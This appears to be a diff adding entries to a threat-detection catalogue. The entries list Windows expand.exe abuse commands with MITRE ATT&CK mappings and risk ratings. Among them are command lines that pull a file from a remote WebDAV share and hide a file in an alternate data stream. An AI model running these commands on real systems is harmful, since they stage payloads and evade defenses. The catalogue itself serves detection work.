@@ -1,0 +1,62 @@
+- command: expand \\webdav\folder\file.bat c:\ADS\file.bat
+  description: Abuse expand.exe to copy a remote file to a local file destination.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Expand/
+  risk: Medium
+  risk_reason: Use of expand in this manner is an abnormal operation which is fairly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically abnormal for most organizations.
+  tool: expand
+  threatactors:
+    N/A:
+      - N/A
+- command: expand c:\ADS\file1.bat c:\ADS\file2.bat
+  description: Abuse expand.exe to copy a file locally to a new location.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Expand/
+  risk: Medium
+  risk_reason: Use of expand in this manner is an abnormal operation which is fairly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically abnormal for most organizations.
+  tool: expand
+  threatactors:
+    N/A:
+      - N/A
+- command: expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat
+  description: Abuse expand.exe to copy a remote file into the Alternate Data Stream (ADS) of a separate local file.
+  killchain:
+    - Actions on Objectives
+    - Installation
+  mitre:
+    Command and Control:
+      - T1105
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Expand/
+  risk: High
+  risk_reason: Use of expand in this manner is an abnormal operation which is fairly suspicious, especially involving ADS.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically abnormal for most organizations.
+  tool: expand
+  threatactors:
+    N/A:
+      - N/A
